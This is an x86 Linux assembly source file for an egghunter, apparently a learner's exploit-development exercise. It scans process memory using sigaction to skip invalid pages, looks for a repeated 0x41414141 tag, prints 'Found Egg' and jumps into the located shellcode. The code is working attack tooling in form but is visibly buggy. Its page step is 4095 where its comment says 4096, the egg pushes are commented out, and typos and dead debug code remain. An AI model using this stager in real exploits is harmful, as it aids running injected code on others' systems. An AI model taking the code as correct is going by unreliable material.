

global _start

section .text

_start:

	mov ebx,esp ;move current (i.e. start to ebx)

	xor eax,eax  ; clear out eax

	;push dword 0x41414141 ; push our "egg"
	mov esi,esp ; save pointer to egg into esi

	;push dword 0x41414141
	
	
	mov edi,esp ; save counter to current address
mem:
	
	inc  ebx ;increment counter
	mov  eax,67 ; sigaction
	mov ecx,ebx ; save counter to sigaction
	int 0x80 ; run sigaction
	cmp al, 0xf2 ; see if a sigfault was return
	je page ; jump to function to increment page by 4096
search1:	
	; woring --cmp dword [esi],41414141 ;esi
	cmp dword [ebx],0x41414141  ; compare counter to egg value
	jne  mem ; if compare is not equal jump to increment memory
	inc ebx;edi;ebx ; inc counter
	jmp search2 ;search for egg a second time

search2:	
	; woring --cmp dword [esi],41414141 ;esi
	cmp dword [ebx],0x41414141  ; compare counter to egg value
	jne  mem ; if compare is not equal jump to increment memory
	inc ebx;edi;ebx ; inc counter
	;assuming we found it, proceed to display that we found it!

found:
	
	mov esi,ebx
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov eax, 0x4
	mov ebx, 0x1
	mov ecx, message
	mov edx, mlen

	int 0x80 ; Display "Found Egg"

	jmp esi ; run shellcode

; A function to increment the emory by 4095
page:
	 mov esi,ebx
        xor eax,eax
        mov eax,0x4
        mov ebx,0x1
        mov ecx,here
        mov edx,mlenhere

        ;int 0x80   
        add edi,4095
	add ebx,4095 ;
        jmp mem 
; Debug value letting me know that I had to jmp page values
printhere:
        mov esi,ebx
        xor eax,eax
        mov eax,0x4
        mov ebx,0x1
        mov ecx,here
        mov edx,mlenhere

        int 0x80    


section .data

	message2: db 'test here'
	here: db 'Jump by 4095'
	mlenhere equ $-here
	
	message: db 'Found Egg',0xa,0x00
	mlen equ $-message

